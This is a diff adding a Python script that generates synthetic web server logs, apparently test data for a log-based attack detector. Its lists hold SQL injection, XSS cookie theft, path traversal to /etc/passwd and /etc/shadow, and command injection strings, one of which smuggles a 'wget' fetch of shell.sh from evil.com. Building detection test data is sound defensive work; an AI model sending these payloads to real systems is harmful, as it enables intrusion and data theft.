@@ -1,0 +1,133 @@
+#!/usr/bin/env python3
+"""Generate realistic sample logs with attack patterns for testing."""
+
+import random, os, json
+from datetime import datetime, timedelta
+
+OUT = os.path.join(os.path.dirname(os.path.dirname(__file__)), "logs", "samples")
+
+NORMAL_IPS  = [f"192.168.1.{i}" for i in range(10, 50)] + ["203.0.113.42","198.51.100.7"]
+ATTACK_IPS  = ["185.220.101.42","45.33.32.156","10.0.0.66","198.199.10.45","192.241.216.56"]
+SCANNER_IPS = ["66.249.66.1","157.55.39.107"]
+
+UAS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
+]
+SCAN_UAS = ["sqlmap/1.7.8#stable","Nikto/2.1.6","Nmap Scripting Engine"]
+
+NORMAL_PATHS = ["/","/index.html","/about","/products","/blog","/api/users",
+                "/static/style.css","/favicon.ico","/robots.txt","/contact"]
+
+SQLI = ["/search?q=' OR 1=1--","/login?user=admin'--&pass=x",
+        "/product?id=1 UNION SELECT username,password FROM users--",
+        "/api?id=1;DROP TABLE users--","/page?id=1 AND SLEEP(5)--"]
+
+XSS  = ["/search?q=<script>alert(document.cookie)</script>",
+        "/comment?text=<img src=x onerror=alert(1)>",
+        "/profile?name=<svg onload=alert('xss')>"]
+
+LFI  = ["/page?file=../../../../etc/passwd",
+        "/include?path=../../../etc/shadow",
+        "/?page=php://filter/convert.base64-encode/resource=index.php",
+        "/download?file=../../.htaccess"]
+
+SCAN_PATHS = ["/wp-admin/","/wp-login.php","/phpmyadmin/","/.git/config",
+              "/.env","/admin/","/config.php","/backup.zip","/shell.php",
+              "/xmlrpc.php","/actuator/health","/.htaccess","/c99.php"]
+
+CMD  = ["/api/run?cmd=;ls+-la","/exec?command=cat+/etc/passwd",
+        "/ping?host=127.0.0.1;wget+http://evil.com/shell.sh","/api?action=$(id)"]
+
+
+def fmt(dt): return dt.strftime("%d/%b/%Y:%H:%M:%S +0000")
+
+def line(ip, path, status, size=None, ua=None, method="GET", ts=None):
+    if ts is None: ts = datetime.utcnow()
+    if size is None: size = random.randint(200, 40000)
+    if ua is None: ua = random.choice(UAS)
+    return f'{ip} - - [{fmt(ts)}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"\n'
+
+
+def generate_apache(filename="apache_sample.log", n_normal=500):
+    os.makedirs(OUT, exist_ok=True)
+    path = os.path.join(OUT, filename)
+    base = datetime.utcnow() - timedelta(hours=2)
+    with open(path, "w") as f:
+        # Normal traffic
+        for i in range(n_normal):
+            ip = random.choice(NORMAL_IPS)
+            url = random.choice(NORMAL_PATHS)
+            st  = random.choices([200,200,301,304,404],[60,10,5,10,5])[0]
+            ts  = base + timedelta(seconds=i*14+random.randint(0,10))
+            f.write(line(ip, url, st, ts=ts))
+        # SQL Injection
+        atk = ATTACK_IPS[0]
+        for i, p in enumerate(SQLI * 4):
+            f.write(line(atk, p, 200, ts=base+timedelta(minutes=30,seconds=i*4)))
+        # XSS
+        atk2 = ATTACK_IPS[1]
+        for i, p in enumerate(XSS * 5):
+            f.write(line(atk2, p, 200, ts=base+timedelta(minutes=45,seconds=i*3)))
+        # LFI
+        atk3 = ATTACK_IPS[2]
+        for i, p in enumerate(LFI * 4):
+            f.write(line(atk3, p, random.choice([200,403,404]), ts=base+timedelta(minutes=60,seconds=i*4)))
+        # Vulnerability Scan
+        sc = SCANNER_IPS[0]
+        for i, p in enumerate(SCAN_PATHS * 5):
+            f.write(line(sc, p, random.choice([200,301,403,404]), ts=base+timedelta(minutes=75,seconds=i*2), ua=random.choice(SCAN_UAS)))
+        # Brute force (50x 401 on login)
+        bf = ATTACK_IPS[3]
+        for i in range(50):
+            f.write(line(bf, "/wp-login.php", 401, ts=base+timedelta(minutes=90,seconds=i*3), method="POST"))
+        # DDoS simulation (600 req in ~1 min)
+        dd = ATTACK_IPS[4]
+        for i in range(600):
+            f.write(line(dd, "/", 200, ts=base+timedelta(minutes=100,seconds=i*0.1)))
+        # Command injection
+        ci = ATTACK_IPS[1]
+        for i, p in enumerate(CMD * 4):
+            f.write(line(ci, p, 200, ts=base+timedelta(minutes=110,seconds=i*5)))
+        # Known scanner UAs
+        for i in range(25):
+            ip = random.choice(ATTACK_IPS)
+            f.write(line(ip, f"/probe{i}", random.choice([200,404]), ts=base+timedelta(minutes=115,seconds=i*3), ua=random.choice(SCAN_UAS)))
+        # Directory brute force (120x 404)
+        dir_atk = ATTACK_IPS[0]
+        for i in range(120):
+            f.write(line(dir_atk, f"/page{i}", 404, ts=base+timedelta(minutes=118,seconds=i*2)))
+    print(f"  ✓ {path} ({n_normal + 600 + 50 + 120 + len(SQLI)*4 + len(LFI)*4 + len(CMD)*4 + len(XSS)*5 + len(SCAN_PATHS)*5 + 25} lines)")
+    return path
+
+
+def generate_json(filename="json_sample.log", n=300):
+    os.makedirs(OUT, exist_ok=True)
+    path = os.path.join(OUT, filename)
+    base = datetime.utcnow() - timedelta(hours=1)
+    with open(path, "w") as f:
+        for i in range(n):
+            ip  = random.choice(NORMAL_IPS + ATTACK_IPS[:2])
+            url = random.choice(NORMAL_PATHS + SQLI[:2] + LFI[:1])
+            ts  = base + timedelta(seconds=i*12)
+            rec = {
+                "timestamp": ts.isoformat()+"Z",
+                "remote_addr": ip,
+                "method": random.choice(["GET","GET","GET","POST"]),
+                "request_uri": url,
+                "status": random.choice([200,200,301,404,403,401]),
+                "body_bytes_sent": random.randint(100,10000),
+                "http_user_agent": random.choice(UAS + SCAN_UAS[:1]),
+            }
+            f.write(json.dumps(rec) + "\n")
+    print(f"  ✓ {path} ({n} lines)")
+    return path
+
+
+if __name__ == "__main__":
+    print("Generating sample log files...")
+    generate_apache()
+    generate_json()
+    print("Done! Run:")
+    print("  python main.py --log logs/samples/apache_sample.log --format apache")
